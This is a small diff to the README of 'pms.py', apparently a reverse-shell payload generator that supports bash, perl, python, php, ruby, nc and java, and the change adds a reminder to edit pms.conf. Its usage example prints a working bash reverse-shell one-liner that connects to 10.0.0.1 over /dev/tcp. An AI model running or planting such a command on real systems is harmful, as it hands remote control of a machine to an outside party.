@@ -39,6 +39,7 @@ shell types : bash, perl, python, php (shell), ruby, nc, nc-2, java, php-rev (fi
 
 Usage
 ----------------
+Don't forget to edit your ```pms.conf``` file
 ```sh
 $ python3 pms.py bash
 bash -i >& /dev/tcp/10.0.0.1/1111 0>&1
